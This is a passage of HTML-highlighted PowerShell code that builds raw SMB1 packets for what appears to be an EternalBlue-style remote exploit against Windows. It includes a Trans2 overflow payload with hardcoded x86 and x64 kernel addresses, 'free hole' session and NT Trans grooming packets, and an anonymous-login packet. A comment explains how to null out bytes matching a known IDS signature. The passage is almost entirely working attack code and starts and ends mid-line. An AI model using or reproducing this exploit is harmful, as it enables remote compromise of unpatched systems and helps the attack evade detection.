class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00           <span class="comment"># PID High</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00   <span class="comment"># Signature1</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00   <span class="comment"># Signature2</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00           <span class="comment"># Reserved</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="variable">$tree_id</span> <span class="comment"># Tree ID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xff,<span class="number">0</span>xfe           <span class="comment"># PID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="variable">$user_id</span> <span class="comment"># UserID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x40,<span class="number">0</span>x00           <span class="comment"># MultiplexIDs</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x01               <span class="comment"># Word count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x01,<span class="number">0</span>x00           <span class="comment"># Echo count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x0c,<span class="number">0</span>x00           <span class="comment"># Byte count</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># echo data</span></span><br><span class="line">    <span class="comment"># this is an existing IDS signature, and can be nulled out</span></span><br><span class="line">    <span class="comment">#$pkt += 0x4a,0x6c,0x4a,0x6d,0x49,0x68,0x43,0x6c,0x42,0x73,0x72,0x00</span></span><br><span class="line">    <span class="variable">$pkt</span> +=  <span class="number">0</span>x41,<span class="number">0</span>x41,<span class="number">0</span>x41,<span class="number">0</span>x41,<span class="number">0</span>x41,<span class="number">0</span>x41,<span class="number">0</span>x41,<span class="number">0</span>x41,<span class="number">0</span>x41,<span class="number">0</span>x41,<span class="number">0</span>x41,<span class="number">0</span>x00</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$pkt</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_smb1_trans2_exploit_packet</span><span class="params">(<span class="variable">$tree_id</span>, <span class="variable">$user_id</span>, <span class="variable">$type</span>, <span class="variable">$timeout</span>)</span></span> &#123;</span><br><span class="line">    <span class="variable">$timeout</span> = (<span class="variable">$timeout</span> * <span class="number">0</span>x10) + <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    [<span class="built_in">Byte</span>[]]  <span class="variable">$pkt</span> = [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00)                   <span class="comment"># Session message</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x10,<span class="number">0</span>x35           <span class="comment"># length</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xff,<span class="number">0</span>x53,<span class="number">0</span>x4D,<span class="number">0</span>x42                <span class="comment"># SMB1</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x33                   <span class="comment"># Trans2 request</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># NT SUCCESS</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x18                   <span class="comment"># Flags</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x07,<span class="number">0</span>xc0               <span class="comment"># Flags2</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># PID High</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Signature1</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Signature2</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Reserved</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="variable">$user_id</span>       <span class="comment"># TreeID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xff,<span class="number">0</span>xfe               <span class="comment"># PID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="variable">$user_id</span>     <span class="comment"># UserID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x40,<span class="number">0</span>x00               <span class="comment"># MultiplexIDs</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x09                   <span class="comment"># Word Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Total Param Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x10               <span class="comment"># Total Data Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Max Param Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Max Data Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00                   <span class="comment"># Max Setup Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00                   <span class="comment"># Reserved</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x10               <span class="comment"># Flags</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x35,<span class="number">0</span>x00,<span class="number">0</span>xd0           <span class="comment"># Timeouts</span></span><br><span class="line">    <span class="variable">$pkt</span> += [<span class="type">bitconverter</span>]::GetBytes(<span class="variable">$timeout</span>)[<span class="number">0</span>] <span class="comment">#timeout is a single int</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Reserved</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x10               <span class="comment"># Parameter Count</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#$pkt += 0x74,0x70               # Parameter Offset</span></span><br><span class="line">    <span class="comment">#$pkt += 0x47,0x46               # Data Count</span></span><br><span class="line">    <span class="comment">#$pkt += 0x45,0x6f               # Data Offset</span></span><br><span class="line">    <span class="comment">#$pkt += 0x4c                   # Setup Count</span></span><br><span class="line">    <span class="comment">#$pkt += 0x4f                   # Reserved</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$type</span> <span class="operator">-eq</span> <span class="string">"eb_trans2_exploit"</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x41) * <span class="number">2957</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x80,<span class="number">0</span>x00,<span class="number">0</span>xa8,<span class="number">0</span>x00                     <span class="comment"># overflow</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x10</span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>xff,<span class="number">0</span>xff</span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x6</span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>xff,<span class="number">0</span>xff</span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x16</span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>xf1,<span class="number">0</span>xdf,<span class="number">0</span>xff             <span class="comment"># x86 addresses</span></span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x8</span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x20,<span class="number">0</span>xf0,<span class="number">0</span>xdf,<span class="number">0</span>xff</span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>xf1,<span class="number">0</span>xdf,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff <span class="comment"># x64</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x60,<span class="number">0</span>x00,<span class="number">0</span>x04,<span class="number">0</span>x10</span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x80,<span class="number">0</span>xef,<span class="number">0</span>xdf,<span class="number">0</span>xff</span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">4</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x10,<span class="number">0</span>x00,<span class="number">0</span>xd0,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff</span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x18,<span class="number">0</span>x01,<span class="number">0</span>xd0,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff</span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x10</span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x60,<span class="number">0</span>x00,<span class="number">0</span>x04,<span class="number">0</span>x10</span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>xc</span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x90,<span class="number">0</span>xff,<span class="number">0</span>xcf,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff,<span class="number">0</span>xff</span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x8</span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x80,<span class="number">0</span>x10</span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>xe</span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x39</span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>xbb</span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x41) * <span class="number">965</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$pkt</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> <span class="operator">-eq</span> <span class="string">"eb_trans2_zero"</span>) &#123;</span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">2055</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x83,<span class="number">0</span>xf3</span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x41) * <span class="number">2039</span></span><br><span class="line">      <span class="comment">#$pkt += 0x00 * 4096</span></span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x41) * <span class="number">4096</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$pkt</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">negotiate_proto_request</span><span class="params">()</span></span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">      [<span class="built_in">Byte</span>[]]  <span class="variable">$pkt</span> = [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00)             <span class="comment"># Message_Type</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x54       <span class="comment"># Length</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>xFF,<span class="number">0</span>x53,<span class="number">0</span>x4D,<span class="number">0</span>x42 <span class="comment"># server_component: .SMB</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x72             <span class="comment"># smb_command: Negotiate Protocol</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00 <span class="comment"># nt_status</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x18             <span class="comment"># flags</span></span><br><span class="line">      <span class="variable">$pkt</span> +=  <span class="number">0</span>x01,<span class="number">0</span>x28         <span class="comment"># flags2</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00         <span class="comment"># process_id_high</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00 <span class="comment"># signature</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00         <span class="comment"># reserved</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00         <span class="comment"># tree_id</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x2F,<span class="number">0</span>x4B         <span class="comment"># process_id</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00         <span class="comment"># user_id</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>xC5,<span class="number">0</span>x5E           <span class="comment"># multiplex_id</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x00             <span class="comment"># word_count</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x31,<span class="number">0</span>x00         <span class="comment"># byte_count</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># Requested Dialects</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x02             <span class="comment"># dialet_buffer_format</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x4C,<span class="number">0</span>x41,<span class="number">0</span>x4E,<span class="number">0</span>x4D,<span class="number">0</span>x41,<span class="number">0</span>x4E,<span class="number">0</span>x31,<span class="number">0</span>x2E,<span class="number">0</span>x30,<span class="number">0</span>x00  <span class="comment"># dialet_name: LANMAN1.0</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x02             <span class="comment"># dialet_buffer_format</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x4C,<span class="number">0</span>x4D,<span class="number">0</span>x31,<span class="number">0</span>x2E,<span class="number">0</span>x32,<span class="number">0</span>x58,<span class="number">0</span>x30,<span class="number">0</span>x30,<span class="number">0</span>x32,<span class="number">0</span>x00  <span class="comment"># dialet_name: LM1.2X002</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x02             <span class="comment"># dialet_buffer_format</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x4E,<span class="number">0</span>x54,<span class="number">0</span>x20,<span class="number">0</span>x4C,<span class="number">0</span>x41,<span class="number">0</span>x4E,<span class="number">0</span>x4D,<span class="number">0</span>x41,<span class="number">0</span>x4E,<span class="number">0</span>x20,<span class="number">0</span>x31,<span class="number">0</span>x2E,<span class="number">0</span>x30,<span class="number">0</span>x00 <span class="comment"># dialet_name3: NT LANMAN 1.0</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x02             <span class="comment"># dialet_buffer_format</span></span><br><span class="line">      <span class="variable">$pkt</span> += <span class="number">0</span>x4E,<span class="number">0</span>x54,<span class="number">0</span>x20,<span class="number">0</span>x4C,<span class="number">0</span>x4D,<span class="number">0</span>x20,<span class="number">0</span>x30,<span class="number">0</span>x2E,<span class="number">0</span>x31,<span class="number">0</span>x32,<span class="number">0</span>x00   <span class="comment"># dialet_name4: NT LM 0.12</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$pkt</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_smb1_nt_trans_packet</span><span class="params">(<span class="variable">$tree_id</span>, <span class="variable">$user_id</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    [<span class="built_in">Byte</span>[]]  <span class="variable">$pkt</span> = [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00)                   <span class="comment"># Session message</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x04,<span class="number">0</span>x38           <span class="comment"># length</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xff,<span class="number">0</span>x53,<span class="number">0</span>x4D,<span class="number">0</span>x42       <span class="comment"># SMB1</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xa0                   <span class="comment"># NT Trans</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># NT SUCCESS</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x18                   <span class="comment"># Flags</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x07,<span class="number">0</span>xc0               <span class="comment"># Flags2</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># PID High</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Signature1</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Signature2</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Reserved</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="variable">$tree_id</span>       <span class="comment"># TreeID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xff,<span class="number">0</span>xfe               <span class="comment"># PID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="variable">$user_id</span>       <span class="comment"># UserID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x40,<span class="number">0</span>x00               <span class="comment"># MultiplexID</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x14                   <span class="comment"># Word Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x01                   <span class="comment"># Max Setup Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Reserved</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x1e,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Total Param Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xd0,<span class="number">0</span>x03,<span class="number">0</span>x01,<span class="number">0</span>x00       <span class="comment"># Total Data Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x1e,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Max Param Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Max Data Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x1e,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Param Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x4b,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Param Offset</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xd0,<span class="number">0</span>x03,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Data Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x68,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Data Offset</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x01                   <span class="comment"># Setup Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Function &lt;unknown&gt;</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Unknown NT transaction (0) setup</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xec,<span class="number">0</span>x03               <span class="comment"># Byte Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">0</span>x1f            <span class="comment"># NT Parameters</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># undocumented</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x01</span><br><span class="line">    <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]](<span class="number">0</span>x00) * <span class="number">0</span>x3cd</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$pkt</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>  <span class="title">make_smb1_free_hole_session_packet</span><span class="params">(<span class="variable">$flags2</span>, <span class="variable">$vcnum</span>, <span class="variable">$native_os</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    [<span class="built_in">Byte</span>[]] <span class="variable">$pkt</span> = <span class="number">0</span>x00                   <span class="comment"># Session message</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x51           <span class="comment"># length</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xff,<span class="number">0</span>x53,<span class="number">0</span>x4D,<span class="number">0</span>x42       <span class="comment"># SMB1</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x73                   <span class="comment"># Session Setup AndX</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># NT SUCCESS</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x18                   <span class="comment"># Flags</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="variable">$flags2</span>                   <span class="comment"># Flags2</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># PID High</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Signature1</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Signature2</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Reserved</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># TreeID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xff,<span class="number">0</span>xfe               <span class="comment"># PID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># UserID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x40,<span class="number">0</span>x00               <span class="comment"># MultiplexID</span></span><br><span class="line">    <span class="comment">#$pkt += 0x00,0x00               # Reserved</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x0c                   <span class="comment"># Word Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xff                   <span class="comment"># No further commands</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00                   <span class="comment"># Reserved</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># AndXOffset</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x04,<span class="number">0</span>x11               <span class="comment"># Max Buffer</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x0a,<span class="number">0</span>x00               <span class="comment"># Max Mpx Count</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="variable">$vcnum</span>                    <span class="comment"># VC Number</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Session key</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># Security blob length</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Reserved</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x80       <span class="comment"># Capabilities</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x16,<span class="number">0</span>x00               <span class="comment"># Byte count</span></span><br><span class="line">    <span class="comment">#$pkt += 0xf0                   # Security Blob: &lt;MISSING&gt;</span></span><br><span class="line">    <span class="comment">#$pkt += 0xff,0x00,0x00,0x00       # Native OS</span></span><br><span class="line">    <span class="comment">#$pkt += 0x00,0x00               # Native LAN manager</span></span><br><span class="line">    <span class="comment">#$pkt += 0x00,0x00               # Primary domain</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="variable">$native_os</span></span><br><span class="line">    <span class="variable">$pkt</span> += [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00) * <span class="number">17</span>              <span class="comment"># Extra byte params</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$pkt</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>  <span class="title">make_smb1_anonymous_login_packet</span></span> &#123;</span><br><span class="line">    <span class="comment"># Neither Rex nor RubySMB appear to support Anon login?</span></span><br><span class="line"></span><br><span class="line">    [<span class="built_in">Byte</span>[]] <span class="variable">$pkt</span> = [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x00)                    <span class="comment"># Session message</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x88           <span class="comment"># length</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xff,<span class="number">0</span>x53,<span class="number">0</span>x4D,<span class="number">0</span>x42             <span class="comment"># SMB1</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x73                   <span class="comment"># Session Setup AndX</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># NT SUCCESS</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x18                   <span class="comment"># Flags</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x07,<span class="number">0</span>xc0               <span class="comment"># Flags2</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># PID High</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Signature1</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00       <span class="comment"># Signature2</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>x00,<span class="number">0</span>x00               <span class="comment"># TreeID</span></span><br><span class="line">    <span class="variable">$pkt</span> += <span class="number">0</span>xff,<span class="number">0</span>xfe               <span 